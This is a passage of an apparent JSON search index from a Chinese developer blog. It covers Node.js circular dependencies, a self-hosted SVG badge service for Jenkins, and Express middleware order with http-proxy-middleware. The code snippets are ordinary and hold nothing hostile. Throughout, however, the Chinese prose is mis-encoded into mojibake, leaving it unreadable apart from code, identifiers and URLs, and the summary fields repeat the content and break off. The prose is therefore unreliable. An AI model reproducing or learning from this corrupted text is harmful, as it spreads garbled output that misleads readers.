devtoolsæœ‰æ—¶å€™å¹¶ä¸ä¼šå®æ—¶çš„è§‚æµ‹åˆ°ç»„ä»¶å±æ€§çš„å˜åŒ–ï¼Œå³ä½¿ç‚¹äº†RefreshæŒ‰é’®ã€‚å¦‚æœç‚¹äº†RefreshæŒ‰é’®è¿˜ä¸è¡Œï¼Œé‚£å»ºè®®ä½ é‡æ–°æ‰“å¼€è°·æ­Œæµè§ˆå™¨çš„devtoolsé¢æ¿ã€‚","title":"WTF!! Vueæ•°ç»„spliceæ–¹æ³•æ— æ³•æ­£å¸¸å·¥ä½œ"},{"content":"æœ¬æ–‡é‡ç‚¹æ˜¯è®²è§£å¦‚ä½•è§£å†³å¾ªç¯ä¾èµ–è¿™ä¸ªé—®é¢˜ã€‚å…³å¿ƒè¿™ä¸ªé—®é¢˜æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Œå¯ä»¥è‡ªè¡Œè°·æ­Œã€‚\nå¦‚ä½•é‡ç°è¿™ä¸ªé—®é¢˜ // a.js const {sayB} = require(\u0026#39;./b.js\u0026#39;) sayB() function sayA () { console.log(\u0026#39;say A\u0026#39;) } module.exports = { sayA } // b.js const {sayA} = require(\u0026#39;./a.js\u0026#39;) sayA() function sayB () { console.log(\u0026#39;say B\u0026#39;) } module.exports = { sayB } æ‰§è¡Œä¸‹é¢çš„ä»£ç \nâœ test git:(master) âœ— node a.js /Users/dd/wj-gitlab/tools/test/b.js:3 sayA() ^ TypeError: sayA is not a function at Object.\u0026lt;anonymous\u0026gt; (/Users/dd/wj-gitlab/tools/test/b.js:3:1) at Module._compile (module.js:635:30) at Object.Module._extensions..js (module.js:646:10) at Module.load (module.js:554:32) at tryModuleLoad (module.js:497:12) at Function.Module._load (module.js:489:3) at Module.require (module.js:579:17) at require (internal/module.js:11:18) at Object.\u0026lt;anonymous\u0026gt; (/Users/dd/wj-gitlab/tools/test/a.js:1:78) at Module._compile (module.js:635:30) sayA is not a functioné‚£ä¹ˆsayAæ˜¯ä¸ªä»€ä¹ˆå‘¢ï¼Œå®é™…ä¸Šå®ƒæ˜¯ undefined\né‡åˆ°è¿™ç§é—®é¢˜æ—¶ï¼Œä½ æœ€å¥½èƒ½æ„è¯†åˆ°å¯èƒ½æ˜¯å¾ªç¯ä¾èµ–çš„é—®é¢˜ï¼Œå¦åˆ™æ‰¾é—®é¢˜å¯èƒ½äº‹å€åŠŸåŠã€‚\nå¦‚ä½•æ‰¾åˆ°å¾ªç¯ä¾èµ–çš„çš„æ–‡ä»¶ ä¸Šæ–‡çš„ç¤ºä¾‹ä»£ç å¾ˆç®€å•ï¼Œ2ä¸ªæ–‡ä»¶ï¼Œå¾ˆå®¹æ˜“æ‰¾å‡ºå¾ªç¯ä¾èµ–ã€‚å¦‚æœæœ‰åå‡ ä¸ªæ–‡ä»¶ï¼Œæ‰‹å·¥å»æ‰¾å¾ªç¯ä¾èµ–çš„æ–‡ä»¶ï¼Œä¹Ÿæ˜¯éå¸¸éº»çƒ¦çš„ã€‚\nä¸‹é¢æ¨èä¸€ä¸ªå·¥å…· madge, å®ƒå¯ä»¥å¯è§†åŒ–çš„æŸ¥çœ‹æ–‡ä»¶ä¹‹é—´çš„ä¾èµ–å…³ç³»ã€‚\næ³¨æ„ä¸‹å›¾1ï¼Œä»¥cli.jsä¸ºèµ·ç‚¹ï¼Œæ‰€æœ‰çš„ç®­å¤´éƒ½æ˜¯å‘å³å±•å¼€çš„ï¼Œè¿™è¯´æ˜æ²¡æœ‰å¾ªç¯ä¾èµ–ã€‚å¦‚æœæœ‰ç®­å¤´å‡ºç°å‘å·¦é€†æµï¼Œé‚£ä¹ˆå°±å¯èƒ½æ˜¯å¾ªç¯ä¾èµ–çš„ç‚¹ã€‚\nå›¾2ä¸­ï¼Œå‡ºç°å‘å·¦çš„ç®­å¤´ï¼Œè¯´æ˜å‡ºç°äº†å¾ªç¯ä¾èµ–ï¼Œè¯´æ˜è¦æ­¤å¤„æ–­å¼€å¾ªç¯ã€‚\nå¦‚ä½•è§£å†³å¾ªç¯ä¾èµ– æ–¹æ¡ˆ1ï¼š å…ˆå¯¼å‡ºè‡ªèº«æ¨¡å— å°†module.exportsæ”¾åˆ°æ–‡ä»¶å¤´éƒ¨ï¼Œå…ˆå°†è‡ªèº«æ¨¡å—å¯¼å‡ºï¼Œç„¶åå†å¯¼å…¥å…¶ä»–æ¨¡å—ã€‚\næ¥è‡ªï¼šhttp://maples7.com/2016/08/17/cyclic-dependencies-in-node-and-its-solution/\n// a.js module.exports = { sayA } const {sayB} = require(\u0026#39;./b.js\u0026#39;) sayB() function sayA () { console.log(\u0026#39;say A\u0026#39;) } // b.js module.exports = { sayB } const {sayA} = require(\u0026#39;./a.js\u0026#39;) console.log(typeof sayA) sayA() function sayB () { console.log(\u0026#39;say A\u0026#39;) } æ–¹æ¡ˆ2ï¼š é—´æ¥è°ƒç”¨ é€šè¿‡å¼•å…¥ä¸€ä¸ªeventçš„æ¶ˆæ¯ä¼ é€’ï¼Œè®©å¤šä¸ªä¸ªæ¨¡å—å¯ä»¥é—´æ¥ä¼ é€’æ¶ˆæ¯ï¼Œå¤šä¸ªæ¨¡å—ä¹‹é—´ä¹Ÿå¯ä»¥é€šè¿‡å‘æ¶ˆæ¯ç›¸äº’è°ƒç”¨ã€‚\n// a.js require(\u0026#39;./b.js\u0026#39;) const bus = require(\u0026#39;./bus.js\u0026#39;) bus.on(\u0026#39;sayA\u0026#39;, sayA) setTimeout(() =\u0026gt; { bus.emit(\u0026#39;sayB\u0026#39;) }, 0) function sayA () { console.log(\u0026#39;say A\u0026#39;) } module.exports = { sayA } // b.js const bus = require(\u0026#39;./bus.js\u0026#39;) bus.on(\u0026#39;sayB\u0026#39;, sayB) setTimeout(() =\u0026gt; { bus.emit(\u0026#39;sayA\u0026#39;) }, 0) function sayB () { console.log(\u0026#39;say B\u0026#39;) } module.exports = { sayB } // bus.js const EventEmitter = require(\u0026#39;events\u0026#39;) class MyEmitter extends EventEmitter {} module.exports = new MyEmitter() æ€»ç»“ å‡ºç°å¾ªç¯ä¾èµ–ï¼Œå¾€å¾€æ˜¯ä»£ç çš„ç»“æ„å‡ºç°äº†é—®é¢˜ã€‚åº”å½“ä¸»åŠ¨å»é¿å…å¾ªç¯ä¾èµ–è¿™ç§é—®é¢˜ï¼Œä½†æ˜¯é‡åˆ°è¿™ç§é—®é¢˜ï¼Œæ— æ³•é¿å…æ—¶ï¼Œä¹Ÿè¦æ„è¯†åˆ°æ˜¯å¾ªç¯ä¾èµ–å¯¼è‡´çš„é—®é¢˜ï¼Œå¹¶æ‰¾æ–¹æ¡ˆè§£å†³ã€‚\næœ€åç»™å‡ºä¸€ä¸ªæœ‰æ„æ€çš„é—®é¢˜ï¼Œä¸‹é¢çš„ä»£ç è¿è¡Œnode a.jsä¼šè¾“å‡ºä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿ\n// a.js var moduleB = require(\u0026#39;./b.js\u0026#39;) setInterval(() =\u0026gt; { console.log(\u0026#39;setInterval A\u0026#39;) }, 500) setTimeout(() =\u0026gt; { console.log(\u0026#39;setTimeout moduleA\u0026#39;) moduleB.sayB() }, 2000) function sayA () { console.log(\u0026#39;say A\u0026#39;) } module.exports = { sayA } // b.js var moduleA = require(\u0026#39;./a.js\u0026#39;) setInterval(() =\u0026gt; { console.log(\u0026#39;setInterval B\u0026#39;) }, 500) setTimeout(() =\u0026gt; { console.log(\u0026#39;setTimeout moduleB\u0026#39;) moduleA.sayA() }, 2000) function sayB () { console.log(\u0026#39;say B\u0026#39;) } module.exports = { sayB } ","permalink":"https://wdd.js.org/posts/2018/10/how-to-fix-circular-dependencies-in-node-js/","summary":"æœ¬æ–‡é‡ç‚¹æ˜¯è®²è§£å¦‚ä½•è§£å†³å¾ªç¯ä¾èµ–è¿™ä¸ªé—®é¢˜ã€‚å…³å¿ƒè¿™ä¸ªé—®é¢˜æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Œå¯ä»¥è‡ªè¡Œè°·æ­Œã€‚\nå¦‚ä½•é‡ç°è¿™ä¸ªé—®é¢˜ // a.js const {sayB} = require(\u0026#39;./b.js\u0026#39;) sayB() function sayA () { console.log(\u0026#39;say A\u0026#39;) } module.exports = { sayA } // b.js const {sayA} = require(\u0026#39;./a.js\u0026#39;) sayA() function sayB () { console.log(\u0026#39;say B\u0026#39;) } module.exports = { sayB } æ‰§è¡Œä¸‹é¢çš„ä»£ç \nâœ test git:(master) âœ— node a.js /Users/dd/wj-gitlab/tools/test/b.js:3 sayA() ^ TypeError: sayA is not a function at Object.\u0026lt;anonymous\u0026gt; (/Users/dd/wj-gitlab/tools/test/b.js:3:1) at Module._compile (module.js:635:30) at Object.Module._extensions..js (module.js:646:10) at Module.load (module.js:554:32) at tryModuleLoad (module.","title":"Node.js å¦‚ä½•æ‰¾å‡ºå¾ªç¯ä¾èµ–çš„æ–‡ä»¶ï¼Ÿå¦‚ä½•è§£å†³å¾ªç¯ä¾èµ–é—®é¢˜ï¼Ÿ"},{"content":"shieldså°å¾½ç« ä»‹ç» ä¸€èˆ¬å¼€æºé¡¹ç›®éƒ½ä¼šæœ‰ä¸€äº›å°å¾½ç« æ¥æ ‡è¯†é¡¹ç›®çš„çŠ¶æ€ä¿¡æ¯ï¼Œå¹¶ä¸”è¿™äº›ä¿¡æ¯æ˜¯ä¼šè‡ªåŠ¨æ›´æ–°çš„ã€‚åœ¨shieldsçš„å®˜ç½‘https://shields.io/#/, ä¸Šé¢æœ‰å„ç§å„æ ·çš„å°å›¾æ ‡ï¼Œå¹¶ä¸”æœ‰å¾ˆå¤šè‡ªå®šä¹‰çš„æ–¹æ¡ˆã€‚\nèµ·å› ï¼šå¦‚ä½•ç»™ç§æœ‰éƒ¨ç½²çš„jenkinsåˆ¶ä½œshieldsæœåŠ¡ï¼Ÿ ç§æœ‰éƒ¨ç½²çš„jenkinsæ˜¯ç”¨æ¥æ‰“åŒ…dockeré•œåƒçš„ï¼Œè€Œæˆ‘æƒ³è·å–æœ€æ–°çš„é¡¹ç›®æ‰“åŒ…çš„jenkinsé•œåƒä¿¡æ¯ã€‚ä½†æ˜¯ç§æœ‰çš„jenkinsé¡¹ç›®ä¿¡æ¯ï¼Œå…¬ç½‘çš„shieldsæœåŠ¡æ˜¯æ— æ³•è·å–å…¶ä¿¡æ¯çš„ã€‚é‚£ä¹ˆå¦‚æœæ­å»ºä¸€ä¸ªç§æœ‰çš„shieldsæœåŠ¡å‘¢ï¼Ÿ\nç¬¬ä¸€æ­¥ï¼šå¦‚ä½•æ ¹æ®ä¸€äº›ä¿¡æ¯ï¼Œåˆ¶ä½œsvgå›¾æ ‡ æŸ¥çœ‹shieldså›¾æ ‡çš„æºç ï¼Œå¯ä»¥çœ‹åˆ°è¿™äº›å›¾æ ‡éƒ½æ˜¯svgæ ¼å¼çš„å›¾æ ‡ã€‚ç„¶åçš„æ€è·¯å°±æ˜¯ï¼Œå°†æ–‡å­—ä¿¡æ¯è½¬æˆsvgå›¾æ ‡ã€‚æœ€åæˆ‘å‘ç°è¿™ä¸ªæ€è·¯æ˜¯ä¸ªæ­»èƒ¡åŒï¼Œ\næœ‰ä¸ªnpmåŒ…å«åšï¼Œtext-to-svg, ä¼¼ä¹å¯ä»¥å°†æ–‡æœ¬è½¬æˆsvg, ä½†æ˜¯çœ‹äº†æ–‡æœ¬è½¬svgçš„æ•ˆæœï¼Œæœæ–­å°±æ”¾å¼ƒäº†ã€‚\næœ€åå›åˆ°èµ·ç‚¹ï¼Œçœ‹äº†shieldså®˜æ–¹ä»“åº“ï¼Œå‘ç°ä¸€ä¸ªtemplatesç›®å½•ï¼Œè±ç„¶å¼€æœ—ã€‚åŸæ¥svgå›¾æ ‡æ˜¯ç”±svgçš„æ¨¡æ¿ç”Ÿæˆçš„ï¼Œæ¯æ¬¡ç”Ÿæˆå›¾æ ‡åªéœ€è¦å°†ä¿¡æ¯æ·»åŠ åˆ°æ¨¡æ¿ä¸­ï¼Œç„¶åå°±å¯ä»¥æ¸²æŸ“å‡ºsvgå­—ç¬¦ä¸²äº†ã€‚\né¡ºç€è¿™ä¸ªæ€è·¯ï¼Œå‘ç°ä¸€ä¸ªåŒ…shields-lightweight\nvar shields = require(\u0026#39;shields-lightweight\u0026#39;); var svgBadge = shields.svg(\u0026#39;subject\u0026#39;, \u0026#39;status\u0026#39;, \u0026#39;red\u0026#39;, \u0026#39;flat\u0026#39;); è¿™ä¸ªåŒ…çš„ç¡®å¯ä»¥ç”Ÿæˆå’Œshieldsä¸€æ ·çš„å°å¾½ç« ï¼Œä½†æ˜¯å¦‚æœå¾½ç« ä¸­æœ‰ä¸­æ–‡ï¼Œé‚£ä¹ˆä¸­æ–‡å°±ä¼šæº¢å‡ºã€‚å› ä¸ºä¸€ä¸ªä¸­æ–‡å­—ç¬¦çš„å®½åº¦è¦æ¯”ä¸€ä¸ªè‹±æ–‡å­—ç¬¦å®½å¾ˆå¤šã€‚\næ‰€ä»¥æˆ‘å°±forkäº†è¿™ä¸ªé¡¹ç›®ï¼Œé‡å†™äº†å›¾æ ‡å®½åº¦è®¡ç®—çš„æ–¹å¼ã€‚shields-less\nnpm install shields-less var shieldsLess = require(\u0026#39;shields-less\u0026#39;) var svgBadge = shieldsLess.svg({ leftText: \u0026#39;npm é»„æ²³è¿œä¸Šç™½äº‘é—´\u0026#39;, rightText: \u0026#39;hello ä¸–ç•Œ\u0026#39; }) var svgBadge2 = shieldsLess.svg({ leftText: \u0026#39;npm é»„æ²³è¿œä¸Šç™½äº‘é—´\u0026#39;, rightText: \u0026#39;hello ä¸–ç•Œ\u0026#39;, style: \u0026#39;square\u0026#39; }) var svgBadge2 = shieldsLess.svg({ leftText: \u0026#39;npm é»„æ²³è¿œä¸Šç™½äº‘é—´\u0026#39;, rightText: \u0026#39;hello ä¸–ç•Œ\u0026#39;, leftColor: \u0026#39;#e64a19\u0026#39;, rightColor: \u0026#39;#448aff\u0026#39;, style: \u0026#39;square\u0026#39; // just two style: square and plat(default) }) æ¸²æŸ“åçš„æ•ˆæœï¼ŒæŸ¥çœ‹åœ¨çº¿demo: https://wdd.js.org/shields-less/example/\nshieldsæœåŠ¡å¼€å‘ shieldsæœåŠ¡å…¶å®å¾ˆç®€å•ã€‚æ¶æ„å¦‚ä¸‹ï¼Œå®¢æˆ·ç«¯æµè§ˆå™¨å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œå‘shieldsæœåŠ¡ï¼ŒshieldæœåŠ¡è§£æè¯·æ±‚ï¼Œå¹¶å‘jenkinsæœåŠ¡å‘é€è¯·æ±‚ï¼ŒjenkinsæœåŠ¡æ¯ä¸ªé¡¹ç›®éƒ½æœ‰jsonçš„httpæ¥å£ï¼Œå¯ä»¥è·å–é¡¹ç›®ä¿¡æ¯çš„ã€‚shieldså°†ä»jenkinsè·å–çš„ä¿¡æ¯å°è£…åˆ°svgå°å›¾æ ‡ä¸­ï¼Œç„¶åå°†svgå°å›¾æ ‡å‘é€åˆ°å®¢æˆ·ç«¯ã€‚\næœ€ç»ˆæ•ˆæœ ","permalink":"https://wdd.js.org/posts/2018/10/how-to-make-shields-badge/","summary":"shieldså°å¾½ç« ä»‹ç» ä¸€èˆ¬å¼€æºé¡¹ç›®éƒ½ä¼šæœ‰ä¸€äº›å°å¾½ç« æ¥æ ‡è¯†é¡¹ç›®çš„çŠ¶æ€ä¿¡æ¯ï¼Œå¹¶ä¸”è¿™äº›ä¿¡æ¯æ˜¯ä¼šè‡ªåŠ¨æ›´æ–°çš„ã€‚åœ¨shieldsçš„å®˜ç½‘https://shields.io/#/, ä¸Šé¢æœ‰å„ç§å„æ ·çš„å°å›¾æ ‡ï¼Œå¹¶ä¸”æœ‰å¾ˆå¤šè‡ªå®šä¹‰çš„æ–¹æ¡ˆã€‚\nèµ·å› ï¼šå¦‚ä½•ç»™ç§æœ‰éƒ¨ç½²çš„jenkinsåˆ¶ä½œshieldsæœåŠ¡ï¼Ÿ ç§æœ‰éƒ¨ç½²çš„jenkinsæ˜¯ç”¨æ¥æ‰“åŒ…dockeré•œåƒçš„ï¼Œè€Œæˆ‘æƒ³è·å–æœ€æ–°çš„é¡¹ç›®æ‰“åŒ…çš„jenkinsé•œåƒä¿¡æ¯ã€‚ä½†æ˜¯ç§æœ‰çš„jenkinsé¡¹ç›®ä¿¡æ¯ï¼Œå…¬ç½‘çš„shieldsæœåŠ¡æ˜¯æ— æ³•è·å–å…¶ä¿¡æ¯çš„ã€‚é‚£ä¹ˆå¦‚æœæ­å»ºä¸€ä¸ªç§æœ‰çš„shieldsæœåŠ¡å‘¢ï¼Ÿ\nç¬¬ä¸€æ­¥ï¼šå¦‚ä½•æ ¹æ®ä¸€äº›ä¿¡æ¯ï¼Œåˆ¶ä½œsvgå›¾æ ‡ æŸ¥çœ‹shieldså›¾æ ‡çš„æºç ï¼Œå¯ä»¥çœ‹åˆ°è¿™äº›å›¾æ ‡éƒ½æ˜¯svgæ ¼å¼çš„å›¾æ ‡ã€‚ç„¶åçš„æ€è·¯å°±æ˜¯ï¼Œå°†æ–‡å­—ä¿¡æ¯è½¬æˆsvgå›¾æ ‡ã€‚æœ€åæˆ‘å‘ç°è¿™ä¸ªæ€è·¯æ˜¯ä¸ªæ­»èƒ¡åŒï¼Œ\næœ‰ä¸ªnpmåŒ…å«åšï¼Œtext-to-svg, ä¼¼ä¹å¯ä»¥å°†æ–‡æœ¬è½¬æˆsvg, ä½†æ˜¯çœ‹äº†æ–‡æœ¬è½¬svgçš„æ•ˆæœï¼Œæœæ–­å°±æ”¾å¼ƒäº†ã€‚\næœ€åå›åˆ°èµ·ç‚¹ï¼Œçœ‹äº†shieldså®˜æ–¹ä»“åº“ï¼Œå‘ç°ä¸€ä¸ªtemplatesç›®å½•ï¼Œè±ç„¶å¼€æœ—ã€‚åŸæ¥svgå›¾æ ‡æ˜¯ç”±svgçš„æ¨¡æ¿ç”Ÿæˆçš„ï¼Œæ¯æ¬¡ç”Ÿæˆå›¾æ ‡åªéœ€è¦å°†ä¿¡æ¯æ·»åŠ åˆ°æ¨¡æ¿ä¸­ï¼Œç„¶åå°±å¯ä»¥æ¸²æŸ“å‡ºsvgå­—ç¬¦ä¸²äº†ã€‚\né¡ºç€è¿™ä¸ªæ€è·¯ï¼Œå‘ç°ä¸€ä¸ªåŒ…shields-lightweight\nvar shields = require(\u0026#39;shields-lightweight\u0026#39;); var svgBadge = shields.svg(\u0026#39;subject\u0026#39;, \u0026#39;status\u0026#39;, \u0026#39;red\u0026#39;, \u0026#39;flat\u0026#39;); è¿™ä¸ªåŒ…çš„ç¡®å¯ä»¥ç”Ÿæˆå’Œshieldsä¸€æ ·çš„å°å¾½ç« ï¼Œä½†æ˜¯å¦‚æœå¾½ç« ä¸­æœ‰ä¸­æ–‡ï¼Œé‚£ä¹ˆä¸­æ–‡å°±ä¼šæº¢å‡ºã€‚å› ä¸ºä¸€ä¸ªä¸­æ–‡å­—ç¬¦çš„å®½åº¦è¦æ¯”ä¸€ä¸ªè‹±æ–‡å­—ç¬¦å®½å¾ˆå¤šã€‚\næ‰€ä»¥æˆ‘å°±forkäº†è¿™ä¸ªé¡¹ç›®ï¼Œé‡å†™äº†å›¾æ ‡å®½åº¦è®¡ç®—çš„æ–¹å¼ã€‚shields-less\nnpm install shields-less var shieldsLess = require(\u0026#39;shields-less\u0026#39;) var svgBadge = shieldsLess.svg({ leftText: \u0026#39;npm é»„æ²³è¿œä¸Šç™½äº‘é—´\u0026#39;, rightText: \u0026#39;hello ä¸–ç•Œ\u0026#39; }) var svgBadge2 = shieldsLess.svg({ leftText: \u0026#39;npm é»„æ²³è¿œä¸Šç™½äº‘é—´\u0026#39;, rightText: \u0026#39;hello ä¸–ç•Œ\u0026#39;, style: \u0026#39;square\u0026#39; }) var svgBadge2 = shieldsLess.svg({ leftText: \u0026#39;npm é»„æ²³è¿œä¸Šç™½äº‘é—´\u0026#39;, rightText: \u0026#39;hello ä¸–ç•Œ\u0026#39;, leftColor: \u0026#39;#e64a19\u0026#39;, rightColor: \u0026#39;#448aff\u0026#39;, style: \u0026#39;square\u0026#39; // just two style: square and plat(default) }) æ¸²æŸ“åçš„æ•ˆæœï¼ŒæŸ¥çœ‹åœ¨çº¿demo: https://wdd.","title":"shieldså°å¾½ç« æ˜¯å¦‚ä½•ç”Ÿæˆçš„ï¼Ÿä»¥åŠæ­å»ºè‡ªå·±çš„shieldæœåŠ¡å™¨"},{"content":"å‰åç«¯åˆ†ç¦»åº”ç”¨çš„æ¶æ„ åœ¨å‰åç«¯åˆ†ç¦»æ¶æ„ä¸­ï¼Œä¸ºäº†é¿å…è·¨åŸŸä»¥åŠæš´éœ²å†…éƒ¨æœåŠ¡åœ°å€ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä¼šåœ¨Expressè¿™å±‚ä¸­åŠ å…¥ä¸€ä¸ªåå‘ä»£ç†ã€‚\næ‰€æœ‰å‘åç«¯æœåŠ¡è®¿é—®çš„è¯·æ±‚ï¼Œéƒ½é€šè¿‡ä»£ç†è½¬å‘åˆ°å†…éƒ¨çš„å„ä¸ªæœåŠ¡ã€‚\nè¿™ä¸ªåå‘ä»£ç†æœåŠ¡å™¨ï¼Œåšèµ·æ¥å¾ˆç®€å•ã€‚ç”¨http-proxy-middlewareè¿™ä¸ªæ¨¡å—ï¼Œå‡ è¡Œä»£ç å°±å¯ä»¥æå®šã€‚\n// app.js Object.keys(proxyTable).forEach(function (context) { app.use(proxyMiddleware(context, proxyTable[context])) }) http-proxy-middlewareå®é™…ä¸Šæ˜¯å¯¹äºnode-http-proxyçš„æ›´åŠ ç®€ä¾¿çš„å°è£…ã€‚node-http-proxyæ˜¯http-proxy-middlewareçš„åº•å±‚åŒ…ï¼Œå¦‚æœnode-http-proxyæœ‰é—®é¢˜ï¼Œé‚£ä¹ˆè¿™ä¸ªé—®é¢˜å°±ä¼šå½±å“åˆ°http-proxy-middlewareè¿™ä¸ªåŒ…ã€‚\næœ€è¿‘çš„bug http-proxy-middlewareæœ€è¿‘æœ‰ä¸ªé—®é¢˜ï¼Œè¯·æ±‚ä½“åœ¨è¢«ä»£ç†è½¬å‘å‰ï¼Œå¦‚æœè¯·æ±‚ä½“è¢«è§£æäº†ã€‚é‚£ä¹ˆåç«¯æœåŠ¡å°†ä¼šæ”¶ä¸åˆ°è¯·æ±‚ç»“æŸçš„æ¶ˆæ¯ï¼Œä»æµè§ˆå™¨çš„ç½‘ç»œé¢æ¿å¯ä»¥çœ‹å‡ºï¼Œä¸€ä¸ªè¯·æ±‚ä¸€ç›´åœ¨pendingçŠ¶æ€ã€‚\nCannot proxy after parsing body #299, å®é™…ä¸Šè¿™ä¸ªé—®é¢˜åœ¨node-http-proxyä¹Ÿè¢«æå‡ºè¿‡ï¼Œè€Œä¸”å¤„äºopençŠ¶æ€ã€‚POST fails/hangs examples to restream also not working #1279\nç›®å‰è¿™ä¸ªbugè¿˜æ˜¯å¤„äºopençŠ¶æ€ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰è§£å†³æ–¹æ¡ˆçš„ã€‚å°±æ˜¯å°†è¯·æ±‚ä½“è§£æçš„ä¸­é—´ä»¶æŒ‚è½½åœ¨ä»£ç†ä¹‹åã€‚\nä¸‹é¢çš„ä»£ç ï¼Œexpress.json()ä¼šå¯¹jsonæ ¼å¼çš„è¯·æ±‚ä½“è¿›è¡Œè§£æã€‚æ–¹æ¡ˆ1åœ¨ä»£ç†å‰å°±è¿›è¡Œbodyè§£æï¼Œæ‰€æœ‰æ ¼å¼æ˜¯jsonçš„è¯·æ±‚ä½“éƒ½ä¼šè¢«è§£æã€‚\nä½†æ˜¯æœ‰äº›èµ°ä»£ç†çš„è¯·æ±‚ï¼Œå¦‚æœæˆ‘ä»¬å¹¶ä¸å…³å¿ƒè¯·æ±‚ä½“çš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Œå®é™…ä¸Šæˆ‘ä»¬å¯ä»¥ä¸è§£æé‚£äº›èµ°ä»£ç†çš„è¯·æ±‚ã€‚æ‰€ä»¥ï¼Œå¯ä»¥å…ˆæŒ‚è½½ä»£ç†ä¸­é—´ä»¶ï¼Œç„¶åæŒ‚è½½è¯·æ±‚ä½“è§£æä¸­é—´ä»¶ï¼Œæœ€åæŒ‚è½½å†…éƒ¨çš„ä¸€äº›æ¥å£æœåŠ¡ã€‚\n// æ–¹æ¡ˆ1 bad app.use(express.json()) Object.keys(proxyTable).forEach(function (context) { app.use(proxyMiddleware(context, proxyTable[context])) }) app.use(\u0026#39;/api\u0026#39;, (req, res, next)=\u0026gt; { }) // æ–¹æ¡ˆ2 good Object.keys(proxyTable).forEach(function (context) { app.use(proxyMiddleware(context, proxyTable[context])) }) app.use(express.json()) app.use(\u0026#39;/api\u0026#39;, (req, res, next)=\u0026gt; { }) æ€»ç»“ ç»è¿‡è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘å¯¹Expressä¸­é—´ä»¶çš„æŒ‚è½½é¡ºåºæœ‰äº†æ›´åŠ æ·±åˆ»çš„è®¤è¯†ã€‚\nåŒæ—¶ï¼Œåœ¨ä½¿ç”¨ç¬¬ä¸‰æ–¹åŒ…çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœè¯¥åŒ…bugï¼Œé‚£ä¹ˆä¹Ÿéœ€è¦è‡ªè¡Œæ‰¾å‡ºåˆé€‚çš„è§£å†³æ–¹æ¡ˆã€‚è€Œè¿™ä¸ªèƒ½åŠ›ï¼Œå¾€å¾€å°±æ˜¯é«˜æ‰‹ä¸æ–°æ‰‹çš„åŒºåˆ«ã€‚\n","permalink":"https://wdd.js.org/posts/2018/09/express-middleware-order-proxy-problem/","summary":"å‰åç«¯åˆ†ç¦»åº”ç”¨çš„æ¶æ„ åœ¨å‰åç«¯åˆ†ç¦»æ¶æ„ä¸­ï¼Œä¸ºäº†é¿å…è·¨åŸŸä»¥åŠæš´éœ²å†…éƒ¨æœåŠ¡åœ°å€ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä¼šåœ¨Expressè¿™å±‚ä¸­åŠ å…¥ä¸€ä¸ªåå‘ä»£ç†ã€‚\næ‰€æœ‰å‘åç«¯æœåŠ¡è®¿é—®çš„è¯·æ±‚ï¼Œéƒ½é€šè¿‡ä»£ç†è½¬å‘åˆ°å†…éƒ¨çš„å„ä¸ªæœåŠ¡ã€‚\nè¿™ä¸ªåå‘ä»£ç†æœåŠ¡å™¨ï¼Œåšèµ·æ¥å¾ˆç®€å•ã€‚ç”¨http-proxy-middlewareè¿™ä¸ªæ¨¡å—ï¼Œå‡ è¡Œä»£ç å°±å¯ä»¥æå®šã€‚\n// app.js Object.keys(proxyTable).forEach(function (context) { app.use(proxyMiddleware(context, proxyTable[context])) }) http-proxy-middlewareå®é™…ä¸Šæ˜¯å¯¹äºnode-http-proxyçš„æ›´åŠ ç®€ä¾¿çš„å°è£…ã€‚node-http-proxyæ˜¯http-proxy-middlewareçš„åº•å±‚åŒ…ï¼Œå¦‚æœnode-http-proxyæœ‰é—®é¢˜ï¼Œé‚£ä¹ˆè¿™ä¸ªé—®é¢˜å°±ä¼šå½±å“åˆ°http-proxy-middlewareè¿™ä¸ªåŒ…ã€‚\næœ€è¿‘çš„bug http-proxy-middlewareæœ€è¿‘æœ‰ä¸ªé—®é¢˜ï¼Œè¯·æ±‚ä½“åœ¨è¢«ä»£ç†è½¬å‘å‰ï¼Œå¦‚æœè¯·æ±‚ä½“è¢«è§£æäº†ã€‚é‚£ä¹ˆåç«¯æœåŠ¡å°†ä¼šæ”¶ä¸åˆ°è¯·æ±‚ç»“æŸçš„æ¶ˆæ¯ï¼Œä»æµè§ˆå™¨çš„ç½‘ç»œé¢æ¿å¯ä»¥çœ‹å‡ºï¼Œä¸€ä¸ªè¯·æ±‚ä¸€ç›´åœ¨pendingçŠ¶æ€ã€‚\nCannot proxy after parsing body #299, å®é™…ä¸Šè¿™ä¸ªé—®é¢˜åœ¨node-http-proxyä¹Ÿè¢«æå‡ºè¿‡ï¼Œè€Œä¸”å¤„äºopençŠ¶æ€ã€‚POST fails/hangs examples to restream also not working #1279\nç›®å‰è¿™ä¸ªbugè¿˜æ˜¯å¤„äºopençŠ¶æ€ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰è§£å†³æ–¹æ¡ˆçš„ã€‚å°±æ˜¯å°†è¯·æ±‚ä½“è§£æçš„ä¸­é—´ä»¶æŒ‚è½½åœ¨ä»£ç†ä¹‹åã€‚\nä¸‹é¢çš„ä»£ç ï¼Œexpress.json()ä¼šå¯¹jsonæ ¼å¼çš„è¯·æ±‚ä½“è¿›è¡Œè§£æã€‚æ–¹æ¡ˆ1åœ¨ä»£ç†å‰å°±è¿›è¡Œbodyè§£æï¼Œæ‰€æœ‰æ 